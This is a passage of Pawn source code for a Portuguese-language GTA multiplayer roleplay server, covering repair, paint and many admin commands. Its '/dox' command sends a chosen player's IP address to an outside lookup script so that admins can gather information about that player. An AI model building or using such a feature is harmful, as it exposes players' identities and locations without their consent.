	fInfo[pInfo[RevisorID[playerid]][Faction]][Bank] += PrecoRevisao[playerid];

	Revisao[playerid] = false;
	PrecoRevisao[playerid] = 0;
	RevisorID[playerid] = 0;

	return 1;
}

COMMAND:aceitarreparacao(playerid, params[], help)
{
	if(Reparacao[playerid] == false) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não tens nenhuma oferta de reparação pendente");
	if(!ProxDetectorS(8.0, playerid, ReparadorID[playerid])) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não estás perto do mecânico");
	if(!IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, COLOR_ERRO, MSG_NOCAR);

	new string[128];

	new car = GetPlayerVehicleID(playerid);
	
	if(pInfo[playerid][SeguradoraPayCount] >= 10) // o seguro paga
	{
        SendClientMessage(ReparadorID[playerid], COLOR_INFO, "O teu seguro pagou a reparação!");
        pInfo[playerid][SeguradoraPayCount] = 0;
        bInfo[pInfo[playerid][Seguradora]][Bank] -= PrecoReparacao[playerid];
	}
	else
	{
		if(GetPlayerMoneyEx(playerid) >= PrecoReparacao[playerid])
		{
			format(string, sizeof(string), "Pagaste a reparação de %d$", PrecoReparacao[playerid]);
			GivePlayerMoneyEx(playerid, -PrecoReparacao[playerid]);
		}
		else
		{
			format(string, sizeof(string), "Pagaste a reparação de %d$ (dinheiro do banco)", PrecoReparacao[playerid]);
			pInfo[playerid][Bank] -= PrecoReparacao[playerid];
		}
	}

	RepairVehicle(car);
	cInfo[car][Vida] = 1000;

	SendClientMessage(playerid, COLOR_INFO, string);
	format(string, sizeof(string), "O jogador %s pagou a sua reparação de %d$", GetPlayerNameEx(playerid), PrecoReparacao[playerid]);
	SendClientMessage(ReparadorID[playerid], COLOR_INFO, string);

	fInfo[pInfo[ReparadorID[playerid]][Faction]][Bank] += PrecoReparacao[playerid];

	Reparacao[playerid] = false;
	PrecoReparacao[playerid] = 0;
	ReparadorID[playerid] = 0;

	return 1;
}

COMMAND:aceitarpintura(playerid, params[], help)
{
	if(Pintura[playerid] == false) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não tens nenhuma oferta de pintura pendente");
	if(!ProxDetectorS(8.0, playerid, PintorID[playerid])) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não estás perto do mecânico");
	if(!IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, COLOR_ERRO, MSG_NOCAR);

	new string[128];

	new car = GetPlayerVehicleID(playerid);

	if(GetPlayerMoneyEx(playerid) >= PrecoPintura[playerid])
	{
		format(string, sizeof(string), "Pagaste a reparação de %d$", PrecoPintura[playerid]);
		GivePlayerMoneyEx(playerid, -PrecoPintura[playerid]);
	}
	else
	{
		format(string, sizeof(string), "Pagaste a reparação de %d$ (dinheiro do banco)", PrecoPintura[playerid]);
		pInfo[playerid][Bank] -= PrecoPintura[playerid];
	}

	cInfo[car][Color1] = Cor1[playerid];
	cInfo[car][Color2] = Cor2[playerid];
	
    ChangeVehicleColor(car, cInfo[car][Color1], cInfo[car][Color2]);

	SendClientMessage(playerid, COLOR_INFO, string);
	format(string, sizeof(string), "O jogador %s pagou a sua reparação de %d$", GetPlayerNameEx(playerid), PrecoPintura[playerid]);
	SendClientMessage(PintorID[playerid], COLOR_INFO, string);

	fInfo[pInfo[ReparadorID[playerid]][Faction]][Bank] += PrecoPintura[playerid];

	Pintura[playerid] = false;
	PrecoPintura[playerid] = 0;
	PintorID[playerid] = 0;
	Cor1[playerid] = 0;
	Cor2[playerid] = 0;

	return 1;
}

COMMAND:staff(playerid, params[], help)
{
	new counter, string[128];
	
	SendClientMessage(playerid, COLOR_ERRO, "_____________________________________________ {00FF00}[ {FFFFFF}STAFF ONLINE {00FF00}] {FF0000}________________________________________________");
	
	foreach(new i : Player)
	{
	    // if(!IsPlayerConnected(i)) continue;
	    if(pInfo[i][Admin] == 0) continue;
	    
	    counter++;
	    
	    if(pInfo[i][Admin] == 1 || pInfo[i][Admin] == 2)
	    {
	        if(AdminDuty[i] == false)
	        {
				format(string, sizeof(string), "{E8E541}%s {FFFFFF}[{E8E541}ID:%d{FFFFFF}] - [ {E8E541}GameMaster {FFFFFF}] - [ {FF0000}Fora de Serviço {FFFFFF}]", GetPlayerNameEx(i), i);
			}
			else
			{
			    format(string, sizeof(string), "{E8E541}%s {FFFFFF}[{E8E541}ID:%d{FFFFFF}] - [ {E8E541}GameMaster {FFFFFF}] - [ {00FF00}Em Serviço {FFFFFF}]", GetPlayerNameEx(i), i);
			}
			SendClientMessage(playerid, COLOR_WHITE, string);
	    }
	    else if(pInfo[i][Admin] == 3 || pInfo[i][Admin] == 4)
		{
	        if(AdminDuty[playerid] == false)
	        {
				format(string, sizeof(string), "{E68D45}%s {FFFFFF}[{E68D45}ID:%d{FFFFFF}] - [ {E68D45}Administrador {FFFFFF}] - [ {FF0000}Fora de Serviço {FFFFFF}]", GetPlayerNameEx(i), i);
			}
			else
			{
			    format(string, sizeof(string), "{E68D45}%s {FFFFFF}[{E68D45}ID:%d{FFFFFF}] - [ {E68D45}Administrador {FFFFFF}] - [ {00FF00}Em Serviço {FFFFFF}]", GetPlayerNameEx(i), i);
			}
			SendClientMessage(playerid, COLOR_WHITE, string);
		}
	    else if(pInfo[i][Admin] == 5)
		{
	        if(AdminDuty[i] == false)
	        {
				format(string, sizeof(string), "{00FFFB}%s {FFFFFF}[{00FFFB}ID:%d{FFFFFF}] - [ {00FFFB}Head Admin {FFFFFF}] - [ {FF0000}Fora de Serviço {FFFFFF}]", GetPlayerNameEx(i), i);
			}
			else
			{
			    format(string, sizeof(string), "{00FFFB}%s {FFFFFF}[{00FFFB}ID:%d{FFFFFF}] - [ {00FFFB}Head Admin {FFFFFF}] - [ {00FF00}Em Serviço {FFFFFF}]", GetPlayerNameEx(i), i);
			}
			SendClientMessage(playerid, COLOR_WHITE, string);
		}
	    else if(pInfo[i][Admin] == 6)
		{
	        if(AdminDuty[i] == false)
	        {
				format(string, sizeof(string), "{00FF00}%s {FFFFFF}[{00FF00}ID:%d{FFFFFF}] - [ {00FF00}Responsável {FFFFFF}] - [ {FF0000}Fora de Serviço {FFFFFF}]", GetPlayerNameEx(i), i);
			}
			else
			{
			    format(string, sizeof(string), "{00FF00}%s {FFFFFF}[{00FF00}ID:%d{FFFFFF}] - [ {00FF00}Responsável {FFFFFF}] - [ {00FF00}Em Serviço {FFFFFF}]", GetPlayerNameEx(i), i);
			}
			SendClientMessage(playerid, COLOR_WHITE, string);
		}
	    else if(pInfo[i][Admin] == 1337)
		{
	        if(AdminDuty[i] == false)
	        {
				format(string, sizeof(string), "{00FF00}%s {FFFFFF}[{00FF00}ID:%d{FFFFFF}] - [ {00FF00}Scripter {FFFFFF}] - [ {FF0000}Fora de Serviço {FFFFFF}]", GetPlayerNameEx(i), i);
			}
			else
			{
			    format(string, sizeof(string), "{00FF00}%s {FFFFFF}[{00FF00}ID:%d{FFFFFF}] - [ {00FF00}Scripter {FFFFFF}] - [ {00FF00}Em Serviço {FFFFFF}]", GetPlayerNameEx(i), i);
			}
			SendClientMessage(playerid, COLOR_WHITE, string);
		}
	}
	
	if(counter == 0) { SendClientMessage(playerid, COLOR_INFO, "Não há staff online neste momento"); }
	
	SendClientMessage(playerid, COLOR_ERRO, "______________________________________________________________________________________________________________");

	return 1;
}

COMMAND:acmds(playerid, params[], help)
{
    if(pInfo[playerid][Admin] == 0) return SendClientMessage(playerid, -1, MSG_NOADMIN);

	SendClientMessage(playerid, COLOR_ERRO, "___________________________________________________________________________________________________");
	
	if(pInfo[playerid][Admin] >= 1)
	{
	    SendClientMessage(playerid, COLOR_GM, "[GameMaster 1:] {FFFFFF}/kick - /aduty - /freeze - /unfreeze - /goto - /aj - /curar - /fixar - /serverstats");
	    SendClientMessage(playerid, COLOR_GM, "[GameMaster 1:] {FFFFFF}/mt - /tt - /check - /gethere - /togglepm - /flip - /gm - /uid - /checkafk - /spec - /specoff");
	}
	if(pInfo[playerid][Admin] >= 2)
	{
	    SendClientMessage(playerid, COLOR_GM, "[GameMaster 2:] {FFFFFF}/acarenter - /getvhere - /respawncarro");
	}
	if(pInfo[playerid][Admin] >= 3)
	{
	    SendClientMessage(playerid, COLOR_ADMIN, "[Administrador 1:] {FFFFFF}/a - /respawngeral - /respawnjoblic - /setskin - /darcolete");
	}
	if(pInfo[playerid][Admin] >= 4)
	{
	    SendClientMessage(playerid, COLOR_ADMIN, "[Administrador 2:] {FFFFFF}/lockcars - /unlockcars - /unlockjob - /desligarmotores - /atestarjob");
	    SendClientMessage(playerid, COLOR_ADMIN, "[Administrador 2:] {FFFFFF}/atestarcarro - /darcarta - /fixjobcars - /crota - /addrota - /delrota");
	}
	if(pInfo[playerid][Admin] >= 5)
	{
	    SendClientMessage(playerid, COLOR_HADMIN, "[Head Admin:] {FFFFFF}/dardinheiro - /abizcmds - /ahousecmds - /adararma - /adardrogas - /adarmateriais");
	    SendClientMessage(playerid, COLOR_HADMIN, "[Head Admin:] {FFFFFF}/tempo - /abuildingcmds - /dargold - /dox");
	}
	if(pInfo[playerid][Admin] >= 6)
	{
	    SendClientMessage(playerid, COLOR_OWNER, "[Responsável:] {FFFFFF}/acidadecmds - /ajobcmds - /acarcmds - /afactioncmds - /apositioncmds");
	    SendClientMessage(playerid, COLOR_OWNER, "[Responsável:] {FFFFFF}/setadmin - /darpaycheck - /setdoenca - /dareuro - /permitirrota - /permitirrotatodos");
	}
	if(pInfo[playerid][Admin] == 1337)
	{
	    SendClientMessage(playerid, COLOR_OWNER, "[Scripter:] {FFFFFF}/uptime - /performance - /forcesave - /close - /toggledebuguj - /toggledebug - /toggledebugkey - /checkip");
	    SendClientMessage(playerid, COLOR_OWNER, "[Scripter:] {FFFFFF}/resetstats");
	}
	
 	SendClientMessage(playerid, COLOR_ERRO, "___________________________________________________________________________________________________");
 	
    return 1;
}

COMMAND:speccar(playerid, params[], help)
{
	if(pInfo[playerid][Admin] < 1) return SendClientMessage(playerid, -1, MSG_NOADMIN);

	new car, string[128];

    if(sscanf(params, "d", car)) return SendClientMessage(playerid, COLOR_CHAT, "[USO]: {FFFFFF}/speccar <vehicleid>");
    if(car <= 0 || car > (MAX_CARROS -1)) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Veículo inválido");

	TogglePlayerSpectating(playerid, 1);
 	PlayerSpectateVehicle(playerid, car);

	format(string, sizeof(string), "Estas agora a dar spec ao carro %d", car);
	SendClientMessage(playerid, COLOR_INFO, string);

	return 1;
}

COMMAND:spec(playerid, params[], help)
{
	if(pInfo[playerid][Admin] < 1) return SendClientMessage(playerid, -1, MSG_NOADMIN);

	new giveplayerid, string[128];

    if(sscanf(params, "d", giveplayerid)) return SendClientMessage(playerid, COLOR_CHAT, "[USO]: {FFFFFF}/spec <playerid>");
	if(!IsPlayerConnected(giveplayerid)) return SendClientMessage(playerid, COLOR_ERRO, MSG_NOTCONNECTED);
	
	if(!IsPlayerInAnyVehicle(giveplayerid))
	{
	 	SetPlayerInterior(playerid, GetPlayerInterior(giveplayerid));
	 	SetPlayerVirtualWorld(playerid, GetPlayerVirtualWorld(giveplayerid));
	 	
	    TogglePlayerSpectating(playerid, 1);
	    PlayerSpectatePlayer(playerid, giveplayerid);
	}
	else
	{
	 	SetPlayerInterior(playerid, GetPlayerInterior(giveplayerid));
	 	SetPlayerVirtualWorld(playerid, GetPlayerVirtualWorld(giveplayerid));
	 	
	    TogglePlayerSpectating(playerid, 1);
	    PlayerSpectateVehicle(playerid, GetPlayerVehicleID(giveplayerid));
	}

	format(string, sizeof(string), "Estas agora a dar spec ao jogador %s", GetPlayerNameEx(giveplayerid));
	SendClientMessage(playerid, COLOR_INFO, string);

	return 1;
}

COMMAND:specoff(playerid, params[], help)
{
	if(pInfo[playerid][Admin] < 1) return SendClientMessage(playerid, -1, MSG_NOADMIN);
	
 	SetPlayerInterior(playerid, 0);
 	SetPlayerVirtualWorld(playerid, 0);
    TogglePlayerSpectating(playerid, 0);

	SendClientMessage(playerid, COLOR_INFO, "Paraste de dar spec");

	SetPlayerArmourEx(playerid, 100, 0);

	return 1;
}

COMMAND:darcolete(playerid, params[], help)
{
	if(pInfo[playerid][Admin] < 3) return SendClientMessage(playerid, -1, MSG_NOADMIN);

	new giveplayerid, string[128];

    if(sscanf(params, "d", giveplayerid)) return SendClientMessage(playerid, COLOR_CHAT, "[USO]: {FFFFFF}/darcolete <playerid>");
	if(!IsPlayerConnected(giveplayerid)) return SendClientMessage(playerid, COLOR_ERRO, MSG_NOTCONNECTED);

	format(string, sizeof(string), "Deste colete ao jogador %s.", GetPlayerNameEx(giveplayerid));
	SendClientMessage(playerid, COLOR_INFO, string);
	format(string, sizeof(string), "O Administrador %s deu-te colete.", GetPlayerNameEx(playerid));
	SendClientMessage(giveplayerid, COLOR_INFO, string);

	SetPlayerArmourEx(playerid, 100, 0);

	return 1;
}

COMMAND:resetstats(playerid, params[], help)
{
	if(pInfo[playerid][Admin] != 1337) return SendClientMessage(playerid, -1, MSG_NOADMIN);

    sStats[0][JoinCount] = 0;
    sStats[0][MinutesPlayed] = 0;
    sStats[0][Ajudas] = 0;
    sStats[0][Comandos] = 0;
    sStats[0][AJs] = 0;
    sStats[0][Kicks] = 0;
    sStats[0][Bans] = 0;
    sStats[0][Rotas] = 0;
    sStats[0][VIPs] = 0;
    
    SendClientMessage(playerid, COLOR_INFO, "Server Stats resetados");

	return 1;
}

COMMAND:serverstats(playerid, params[], help)
{
	if(pInfo[playerid][Admin] < 1) return SendClientMessage(playerid, -1, MSG_NOADMIN);

	new sdialog[1024];
	
	format(sdialog, sizeof(sdialog),
	"Stat\tValor\n\
	Número de conexões\t%d\n\
	Minutos jogados\t%d\n\
	Pedidos de ajuda\t%d\n\
	Comandos\t%d\n\
	Admin Jails\t%d\n\
	Kicks\t%d\n\
	Bans\t%d\n\
	VIP's Comprados\t%d\n\
	Carros Comprados\t%d\n\
	PM's enviadas\t%d\n\
	Rotas feitas\t%d", sStats[0][JoinCount], sStats[0][MinutesPlayed], sStats[0][Ajudas], sStats[0][Comandos], sStats[0][AJs], sStats[0][Kicks], sStats[0][Bans], sStats[0][VIPs], sStats[0][CarrosComprados], sStats[0][PMs], sStats[0][Rotas]);

	ShowPlayerDialog(playerid, 6157, DIALOG_STYLE_TABLIST_HEADERS, "{FFFF00}SERVER STATS", sdialog, "Ok", "");

	return 1;
}

COMMAND:checkip(playerid, params[], help)
{
	if(pInfo[playerid][Admin] != 1337) return SendClientMessage(playerid, -1, MSG_NOADMIN);

	new string[128], ipToCheck[16], found = 0;

    if(sscanf(params, "s[16]", ipToCheck)) return SendClientMessage(playerid, COLOR_CHAT, "[USO]: {FFFFFF}/checkip <ip> ");

    foreach(new i : Player)
    {
        new playerIp[16];
        
        GetPlayerIp(i, playerIp, sizeof(playerIp));
        
        if(strfind(ipToCheck, playerIp, true) != -1)
        {
			format(string, sizeof(string), "Jogador %s (ID:%d) encontrado com o IP [%s].", GetPlayerNameEx(i), i, playerIp);
			SendClientMessage(playerid, COLOR_INFO, string);
			found = 1;
        }
    }
    
    if(found == 0)
    {
        SendClientMessage(playerid, COLOR_INFO, "Nenhum jogador com esse IP encontrado");
    }

	return 1;
}

COMMAND:dox(playerid, params[], help)
{
	if(pInfo[playerid][Admin] < 5) return SendClientMessage(playerid, -1, MSG_NOADMIN);

	new giveplayerid, string[128], playerIP[16];

    if(sscanf(params, "d", giveplayerid)) return SendClientMessage(playerid, COLOR_CHAT, "[USO]: {FFFFFF}/dox <playerid> ");
	if(!IsPlayerConnected(giveplayerid)) return SendClientMessage(playerid, COLOR_ERRO, MSG_NOTCONNECTED);

	GetPlayerIp(giveplayerid, playerIP, sizeof(playerIP));
	
	format(string, sizeof(string), "tools.portugalfunmaps.pt/gta/PCRP/dox.php?pw=%s&ip=%s", HTTP_PASSWORD, playerIP);
	HTTP(playerid, HTTP_GET, string, "", "HttpDox");
	
	format(string, sizeof(string), "A receber informações sobre o IP (%s) do jogador %s", playerIP, GetPlayerNameEx(giveplayerid));
	SendClientMessage(playerid, COLOR_INFO, string);

	return 1;
}

COMMAND:delrota(playerid, params[], help)
{
	if(pInfo[playerid][Admin] < 4) return SendClientMessage(playerid, -1, MSG_NOADMIN);

	new rotaname[17], string[64];

    if(sscanf(params, "s[16]", rotaname)) return SendClientMessage(playerid, COLOR_CHAT, "[USO]: {FFFFFF}/delrota <nome da rota>");

	format(string, sizeof(string), "PCRP/Rotas/%s.ini", rotaname);

	if(!fexist(string)) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não existe essa rota");
	else
	{
        fremove(string);
		SendClientMessage(playerid, COLOR_INFO, "Rota apagada.");
	}

	return 1;
}

COMMAND:addrota(playerid, params[], help)
{
	if(pInfo[playerid][Admin] < 4) return SendClientMessage(playerid, -1, MSG_NOADMIN);

	new rotaname[17], num, string[64], File:hFile, entry[256], Float:pX, Float:pY, Float:pZ;

    if(sscanf(params, "s[16]d", rotaname, num)) return SendClientMessage(playerid, COLOR_CHAT, "[USO]: {FFFFFF}/addrota <nome da rota> <number>");
    if(num <= 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Número inválido (maior que 0)");
    
    GetPlayerPos(playerid, pX, pY, pZ);

	format(string, sizeof(string), "PCRP/Rotas/%s.ini", rotaname);

	if(!fexist(string)) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não existe essa rota");
	else
	{
	    if(num > 1)
	    {
	        format(entry, sizeof(entry), "case %d: { SetPlayerCheckpoint(playerid, %f, %f, %f, 5.0); var[playerid]=%d; }\r\n", num, pX, pY, pZ, num+1);
	    }
		else
		{
		    format(entry, sizeof(entry), "SetPlayerCheckpoint(playerid, %f, %f, %f, 5.0); var[playerid] = 2;\r\n", pX, pY, pZ);
		}

		hFile = fopen(string, io_append);
		fwrite(hFile, entry);
		fclose(hFile);
		
		format(string, sizeof(string), "Rota %d criada em %s.", num, rotaname);
		SendClientMessage(playerid, COLOR_INFO, string);
	}

	return 1;
}

COMMAND:crota(playerid, params[], help)
{
	if(pInfo[playerid][Admin] < 4) return SendClientMessage(playerid, -1, MSG_NOADMIN);

	new rotaname[17], string[64], File:hFile;

    if(sscanf(params, "s[16]", rotaname)) return SendClientMessage(playerid, COLOR_CHAT, "[USO]: {FFFFFF}/crota <nome da rota>");

	format(string, sizeof(string), "PCRP/Rotas/%s.ini", rotaname);
	
	if(fexist(string)) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Já existe uma rota com esse nome.");
	else
	{
		hFile = fopen(string, io_append);
		fwrite(hFile, "");
		fclose(hFile);
		
		SendClientMessage(playerid, COLOR_INFO, "Rota criada.");
	}

	return 1;
}

COMMAND:dargold(playerid, params[], help)
{
	if(pInfo[playerid][Admin] < 6) return SendClientMessage(playerid, -1, MSG_NOADMIN);

	new giveplayerid, golds, string[64];

    if(sscanf(params, "dd", giveplayerid, golds)) return SendClientMessage(playerid, COLOR_CHAT, "[USO]: {FFFFFF}/dargold <playerid> <golds>");
	if(!IsPlayerConnected(giveplayerid)) return SendClientMessage(playerid, COLOR_ERRO, MSG_NOTCONNECTED);

	format(string, sizeof(string), "Deste %d golds ao jogador %s.", golds, GetPlayerNameEx(giveplayerid));
	SendClientMessage(playerid, COLOR_INFO, string);
	format(string, sizeof(string), "O Administrador %s deu-te %d golds.", GetPlayerNameEx(playerid), golds);
	SendClientMessage(giveplayerid, COLOR_INFO, string);

	pInfo[giveplayerid][Golds] += golds;

	return 1;
}

COMMAND:forcesave(playerid, params[], help)
{
	if(pInfo[playerid][Admin] != 1337) return SendClientMessage(playerid, -1, MSG_NOADMIN);
	
	GuardarServidor();

	SendClientMessage(playerid, COLOR_INFO, "Forçaste o backup do servidor!");

	return 1;
}

COMMAND:performance(playerid, params[], help)
{
	if(pInfo[playerid][Admin] != 1337) return SendClientMessage(playerid, -1, MSG_NOADMIN);

	new string[128], comandos, onptext, updatejogador, onpkey, ping;
	
	if(TickCount == 0 || TickTotal == 0) comandos = 0; else comandos = floatround(TickTotal/TickCount, floatround_round);
	if(TickCount_Text == 0 || TickTotal_Text == 0) onptext = 0; else onptext = floatround(TickTotal_Text/TickCount_Text, floatround_round);
	if(TickCount_Update == 0 || TickTotal_Update == 0) updatejogador = 0; else updatejogador = floatround(TickTotal_Update/TickCount_Update, floatround_round);
	if(TickCount_Key == 0 || TickTotal_Key == 0) onpkey = 0; else onpkey = floatround(TickTotal_Key/TickCount_Key, floatround_round);
	if(PingCount == 0 || PingTotal == 0) ping = 0; else ping = floatround(PingTotal/PingCount, floatround_round);

	format(string, sizeof(string), "Comandos: %d ms | OnPlayerText: %d ms | UpdateJogador: %d ms | OnPlayerKeyStateChange : %d ms | Ping: %d ms", comandos, onptext, updatejogador, onpkey, ping);
	SendClientMessage(playerid, COLOR_INFO, string);

	return 1;
}

COMMAND:permitirrotatodos(playerid, params[], help)
{
	if(pInfo[playerid][Admin] < 6) return SendClientMessage(playerid, -1, MSG_NOADMIN);

	new string[128];

    foreach(new i : Player)
    {
        // if(!IsPlayerConnected(i)) continue;
        
        pInfo[i][TempoRota] = 0;
    }

	format(string, sizeof(string), "O Administrador %s deu a toda a gente permissão para fazer rota. Não se esqueçam de lhe agradecer!", GetPlayerNameEx(playerid));
	SendClientMessageToAll(COLOR_INFO, string);

	return 1;
}

COMMAND:permitirrota(playerid, params[], help)
{
	if(pInfo[playerid][Admin] < 6) return SendClientMessage(playerid, -1, MSG_NOADMIN);

	new giveplayerid, string[128];

    if(sscanf(params, "d", giveplayerid)) return SendClientMessage(playerid, COLOR_CHAT, "[USO]: {FFFFFF}/permitirrota <playerid>");
	if(!IsPlayerConnected(giveplayerid)) return SendClientMessage(playerid, COLOR_ERRO, MSG_NOTCONNECTED);

	format(string, sizeof(string), "Permitiste ao jogador %s fazer uma rota.", GetPlayerNameEx(giveplayerid));
	SendClientMessage(playerid, COLOR_INFO, string);
	format(string, sizeof(string), "O Administrador %s deu-te permissão para fazeres uma rota.", GetPlayerNameEx(playerid));
	SendClientMessage(giveplayerid, COLOR_INFO, string);
	
	pInfo[giveplayerid][TempoRota] = 0;

	return 1;
}

COMMAND:darcarta(playerid, params[], help)
{
	if(pInfo[playerid][Admin] < 4) return SendClientMessage(playerid, -1, MSG_NOADMIN);

	new giveplayerid, carta[17], string[64];

    if(sscanf(params, "ds[16]", giveplayerid, carta))
    {
        SendClientMessage(playerid, COLOR_CHAT, "[USO]: {FFFFFF}/darcarta <playerid> <carta>");
        SendClientMessage(playerid, COLOR_CHAT, "[Cartas]: {FFFFFF}ligeiros, motociclos, pesados, barco");
        
        return 1;
    }
	if(!IsPlayerConnected(giveplayerid)) return SendClientMessage(playerid, COLOR_ERRO, MSG_NOTCONNECTED);
	
	if(strlen(carta) == 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Carta inválida.");
	
	if(strcmp(carta, "ligeiros", true) == 0)
	{
		format(string, sizeof(string), "Deste a Carta de Ligeiros ao jogador %s", GetPlayerNameEx(giveplayerid));
		SendClientMessage(playerid, COLOR_INFO, string);
	
		format(string, sizeof(string), "O Administrador %s deu-te a Carta de Ligeiros", GetPlayerNameEx(playerid));
		SendClientMessage(giveplayerid, COLOR_INFO, string);
		
		pInfo[giveplayerid][CartaLig] = 1;
	}
	else if(strcmp(carta, "motociclos", true) == 0)
	{
		format(string, sizeof(string), "Deste a Carta de Motociclos ao jogador %s", GetPlayerNameEx(giveplayerid));
		SendClientMessage(playerid, COLOR_INFO, string);

		format(string, sizeof(string), "O Administrador %s deu-te a Carta de Motociclos", GetPlayerNameEx(playerid));
		SendClientMessage(giveplayerid, COLOR_INFO, string);

		pInfo[giveplayerid][CartaMota] = 1;
	}
	else if(strcmp(carta, "pesados", true) == 0)
	{
		format(string, sizeof(string), "Deste a Carta de Pesados ao jogador %s", GetPlayerNameEx(giveplayerid));
		SendClientMessage(playerid, COLOR_INFO, string);

		format(string, sizeof(string), "O Administrador %s deu-te a Carta de Pesados", GetPlayerNameEx(playerid));
		SendClientMessage(giveplayerid, COLOR_INFO, string);

		pInfo[giveplayerid][CartaPesados] = 1;
	}
	else if(strcmp(carta, "barco", true) == 0)
	{
		format(string, sizeof(string), "Deste a Carta de Barco ao jogador %s", GetPlayerNameEx(giveplayerid));
		SendClientMessage(playerid, COLOR_INFO, string);

		format(string, sizeof(string), "O Administrador %s deu-te a Carta de Barco", GetPlayerNameEx(playerid));
		SendClientMessage(giveplayerid, COLOR_INFO, string);

		pInfo[giveplayerid][CartaBarco] = 1;
	}

	return 1;
}

COMMAND:checkafk(playerid, params[], help)
{
	if(pInfo[playerid][Admin] == 0) return SendClientMessage(playerid, -1, MSG_NOADMIN);

	new giveplayerid, string[64];

    if(sscanf(params, "d", giveplayerid)) return SendClientMessage(playerid, COLOR_CHAT, "[USO]: {FFFFFF}/checkafk <playerid>");
	if(!IsPlayerConnected(giveplayerid)) return SendClientMessage(playerid, COLOR_ERRO, MSG_NOTCONNECTED);
	
	format(string, sizeof(string), "%s (ID:%d) está AFK há %d minutos.", GetPlayerNameEx(giveplayerid), giveplayerid, AFKWarning[giveplayerid]);
	SendClientMessage(playerid, COLOR_INFO, string);

	return 1;
}

COMMAND:tempo(playerid, params[], help)
{
	if(pInfo[playerid][Admin] < 5) return SendClientMessage(playerid, -1, MSG_NOADMIN);

	new tempo;

    if(sscanf(params, "d", tempo)) return SendClientMessage(playerid, COLOR_CHAT, "[USO]: {FFFFFF}/tempo <tempoid (0-20)>");
	if(tempo < 0 || tempo > 20) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Tempo inválido (0-20).");

	Meteo(tempo);

	return 1;
}

COMMAND:atestarcarro(playerid, params[], help)
{
    if(pInfo[playerid][Admin] < 4) return SendClientMessage(playerid, -1, MSG_NOADMIN);
    if(!IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, COLOR_ERRO, MSG_NOCAR);

	new car = GetPlayerVehicleID(playerid);
	
	cInfo[car][Gasolina] = 100;

    SendClientMessage(playerid, COLOR_INFO, "Atestaste o carro");

    return 1;
}

COMMAND:atestarjob(playerid, params[], help)
{
    if(pInfo[playerid][Admin] < 4) return SendClientMessage(playerid, -1, MSG_NOADMIN);

    new string[128];

    for(new c = 0; c < MAX_CARROS; c++)
    {
        if(cInfo[c][Type] == -1 && cInfo[c][Type] != -2) continue;
        
		cInfo[c][Gasolina] = 100;
    }

    format(string, sizeof(string), "O Administrador %s atestou os carros de Job/Faction/Licenças do servidor!", GetPlayerNameEx(playerid));
    SendClientMessageToAll(COLOR_INFO, string);

    return 1;
}

COMMAND:uid(playerid, params[], help)
{
	if(pInfo[playerid][Admin] == 0) return SendClientMessage(playerid, -1, MSG_NOADMIN);

	new uid, string[128], counter;

    if(sscanf(params, "d", uid)) return SendClientMessage(playerid, COLOR_CHAT, "[USO]: {FFFFFF}/uid <uid>");

	foreach(new i : Player)
	{
		if(pInfo[i][UID] == uid)
		{
			format(string, sizeof(string), "UID %d: %s (ID:%d)", uid, GetPlayerNameEx(i), i);
			SendClientMessage(playerid, COLOR_ADMIN, string);

			counter++;
			break;
		}
	}
	
	if(counter == 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não há ninguém com esse UID online.");

	return 1;
}

COMMAND:a(playerid, params[], help)
{
	if(pInfo[playerid][Admin] < 3) return SendClientMessage(playerid, -1, MSG_NOADMIN);

	new chat[64], string[128];

    if(sscanf(params, "s[64]", chat)) return SendClientMessage(playerid, COLOR_CHAT, "[USO]: {FFFFFF}/gm <mensagem>");

	foreach(new i : Player)
	{
		// if(!IsPlayerConnected(i)) continue;
		if(pInfo[i][Admin] < 3) continue;

		format(string, sizeof(string), "%s (ID:%d): %s", GetPlayerNameEx(playerid), playerid, chat);
		SendClientMessage(i, COLOR_ADMIN, string);
	}

	return 1;
}

COMMAND:gm(playerid, params[], help)
{
	if(pInfo[playerid][Admin] == 0) return SendClientMessage(playerid, -1, MSG_NOADMIN);

	new chat[64], string[128];

    if(sscanf(params, "s[64]", chat)) return SendClientMessage(playerid, COLOR_CHAT, "[USO]: {FFFFFF}/gm <mensagem>");

	foreach(new i : Player)
	{
		// if(!IsPlayerConnected(i)) continue;
		if(pInfo[i][Admin] == 0) continue;

		format(string, sizeof(string), "%s (ID:%d): %s", GetPlayerNameEx(playerid), playerid, chat);
		SendClientMessage(i, COLOR_GM, string);
	}

	return 1;
}

COMMAND:flip(playerid, params[], help)
{
    if(pInfo[playerid][Admin] == 0) return SendClientMessage(playerid, -1, MSG_NOADMIN);

	new currentveh;
 	new Float:angle;

	currentveh = GetPlayerVehicleID(playerid);
 	GetVehicleZAngle(currentveh, angle);
 	SetVehicleZAngle(currentveh, angle);

	return 1;
}

COMMAND:togglepm(playerid, params[], help)
{
    if(pInfo[playerid][Admin] == 0) return SendClientMessage(playerid, -1, MSG_NOADMIN);

	if(PMStatus[playerid] == false)
	{
	    SendClientMessage(playerid, COLOR_INFO, "Ligaste as tuas PM's");
	    
	    PMStatus[playerid] = true;
	}
	else
	{
	    SendClientMessage(playerid, COLOR_INFO, "Desligaste as tuas PM's");

	    PMStatus[playerid] = false;
	}
	
	return 1;
}

COMMAND:toggledebug(playerid, params[], help)
{
    if(pInfo[playerid][Admin] != 1337) return SendClientMessage(playerid, -1, MSG_NOADMIN);

	if(DebugStatus[playerid] == false)
	{
	    SendClientMessage(playerid, COLOR_INFO, "Debug ligado");

	    DebugStatus[playerid] = true;
	}
	else
	{
